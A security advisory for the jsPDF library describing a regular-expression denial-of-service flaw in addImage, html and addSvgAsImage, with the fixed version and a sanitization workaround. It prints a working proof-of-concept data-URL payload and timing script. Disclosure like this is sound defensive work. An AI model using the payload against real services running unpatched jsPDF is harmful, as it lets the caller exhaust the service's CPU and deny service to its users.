summary: "jsPDF Bypass Regular Expression Denial of Service (ReDoS)\n### Impact\nUser control\
  \ of the first argument of the `addImage` method results in CPU utilization and denial of\
  \ service.\n\nIf given the possibility to pass unsanitized image urls to the `addImage` method,\
  \ a user can provide a harmful data-url that results in high CPU utilization and denial of\
  \ service.\n\nOther affected methods are: `html`, `addSvgAsImage`.\n\nExample payload:\n```js\n\
  import { jsPDF } from \"jpsdf\" \n\nconst doc = new jsPDF();\nconst payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=s\\\
  x00base64,undefined';\n\nconst startTime = performance.now()\n\ntry {\n doc.addImage(payload,\
  \ \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} catch (err) {\n  const endTime = performance.now()\n\
  \  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)\n}\n\ndoc.save(\"\
  a4.pdf\");\n```\n\n### Patches\nThe vulnerability was fixed in jsPDF 3.0.1. Upgrade to jspdf@>=3.0.1\n\
  \n### Workarounds\nSanitize image urls before passing it to the `addImage` method or one of\
  \ the other affected methods.\n\n### Credits\nResearcher: Aleksey Solovev (Positive Technologies)"
